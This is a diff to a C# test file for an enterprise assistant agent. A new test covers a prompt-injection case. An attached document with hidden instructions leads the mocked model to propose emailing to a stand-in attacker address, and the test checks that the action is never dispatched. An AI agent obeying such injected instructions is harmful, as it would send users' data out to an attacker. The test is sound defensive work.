@@ -1,3 +1,4 @@
+using Microsoft.Extensions.Configuration;
 using FluentAssertions;
 using Microsoft.Extensions.Logging.Abstractions;
 using Moq;
@@ -6,20 +7,29 @@ using OCAP.Agents.Abstractions.Models;
 using OCAP.Agents.Abstractions.Ports;
 using OCAP.Agents.Abstractions.Providers;
 using OCAP.Agents.Application.Services;
-using OCAP.Agents.Application.UseCases;
 using Xunit;
 
 namespace OCAP.Agents.Tests;
 
 public class AgentRuntimeAndEnterpriseAssistantTests
 {
+    /// <summary>El agente con dependencias neutras: sin herramientas ni contexto de sistema.</summary>
+    private static EnterpriseAssistantAgent CreateAssistant(ILanguageModelProviderSelector selector) =>
+        new(selector,
+            new ToolRegistry(),
+            Mock.Of<IActionDispatcher>(),
+            Mock.Of<IOcapSystemContextProvider>(c =>
+                c.GetTenantSnapshotAsync(It.IsAny<Guid>(), It.IsAny<CancellationToken>()) == Task.FromResult(string.Empty)),
+            Mock.Of<IConfiguration>(),
+            NullLogger<EnterpriseAssistantAgent>.Instance);
+
     [Fact]
     public async Task EnterpriseAssistantAgent_Should_Process_Request_Using_LanguageModelProvider()
     {
         // Arrange
         var mockProvider = new MockLanguageModelProvider("OpenAI", "Respuesta de Inteligencia Empresarial OCAP");
         var selector = new SingleProviderSelector(mockProvider);
-        var agent = new EnterpriseAssistantAgent(selector, NullLogger<EnterpriseAssistantAgent>.Instance);
+        var agent = CreateAssistant(selector);
 
         var context = new AgentContext(
             EnterpriseAssistantAgent.EnterpriseAssistantAgentId,
@@ -39,12 +49,36 @@ public class AgentRuntimeAndEnterpriseAssistantTests
     }
 
     [Fact]
+    public async Task ToolsProposedFromAttachedContent_AreNotExecuted()
+    {
+        // Un documento adjunto con instrucciones escondidas lleva al modelo a pedir un correo: no debe enviarse.
+        var dispatcher = new Mock<IActionDispatcher>();
+        var provider = new MockLanguageModelProvider("Gemini",
+            """{"reply":"Envío el resumen.","tool":"SendEmailTool","args":{"To":"atacante@ejemplo.com","Subject":"x","Body":"y"}}""");
+        var agent = new EnterpriseAssistantAgent(
+            new SingleProviderSelector(provider),
+            new ToolRegistry(),
+            dispatcher.Object,
+            Mock.Of<IOcapSystemContextProvider>(c =>
+                c.GetTenantSnapshotAsync(It.IsAny<Guid>(), It.IsAny<CancellationToken>()) == Task.FromResult(string.Empty)),
+            Mock.Of<IConfiguration>(),
+            NullLogger<EnterpriseAssistantAgent>.Instance);
+        var context = new AgentContext(EnterpriseAssistantAgent.EnterpriseAssistantAgentId, Guid.NewGuid(), Guid.NewGuid(), "Resume el PDF");
+        context.EnvironmentVariables[EnterpriseAssistantAgent.UntrustedContentKey] = true;
+
+        var result = await agent.ProcessRequestAsync(context);
+
+        result.OutputMessage.Should().Contain("No ejecuto acciones");
+        dispatcher.Verify(d => d.DispatchActionAsync(It.IsAny<Guid>(), It.IsAny<Guid>(), It.IsAny<Guid>(), It.IsAny<OCAP.Agents.Domain.Entities.AgentAction>(), It.IsAny<CancellationToken>()), Times.Never);
+    }
+
+    [Fact]
     public async Task AgentRuntime_Should_Execute_AssistantAgent_Successfully()
     {
         // Arrange
         var mockProvider = new MockLanguageModelProvider("Gemini", "Procesado por Gemini");
         var selector = new SingleProviderSelector(mockProvider);
-        var agent = new EnterpriseAssistantAgent(selector, NullLogger<EnterpriseAssistantAgent>.Instance);
+        var agent = CreateAssistant(selector);
         var runtime = new AgentRuntime(agent, NullLogger<AgentRuntime>.Instance);
 
         var context = new AgentContext(
@@ -71,36 +105,6 @@ public class AgentRuntimeAndEnterpriseAssistantTests
 
         // Assert
         agentId.Should().Be(EnterpriseAssistantAgent.EnterpriseAssistantAgentId);
-    }
-
-    [Fact]
-    public async Task ProcessAgentMessageUseCase_Should_Delegate_To_AgentRuntime_When_Present()
-    {
-        // Arrange
-        var mockProvider = new MockLanguageModelProvider("Ollama", "Procesado localmente con Ollama");
-        var selector = new SingleProviderSelector(mockProvider);
-        var agent = new EnterpriseAssistantAgent(selector, NullLogger<EnterpriseAssistantAgent>.Instance);
-        var runtime = new AgentRuntime(agent, NullLogger<AgentRuntime>.Instance);
-        var resolver = new AgentResolver();
-
-        var agentRepoMock = new Mock<IAgentRepository>();
-        var contextRepoMock = new Mock<IConversationContextRepository>();
-        var actionDispatcherMock = new Mock<IActionDispatcher>();
-
-        var useCase = new ProcessAgentMessageUseCase(
-            agentRepoMock.Object,
-            contextRepoMock.Object,
-            new RuleBasedIntentResolver(),
-            actionDispatcherMock.Object,
-            NullLogger<ProcessAgentMessageUseCase>.Instance,
-            resolver,
-            runtime);
-
-        // Act
-        var result = await useCase.ExecuteAsync(Guid.NewGuid(), "Analizar reporte", Guid.NewGuid(), Guid.NewGuid());
-
-        // Assert
-        result.Should().Be("Procesado localmente con Ollama");
     }
 
     [Fact]
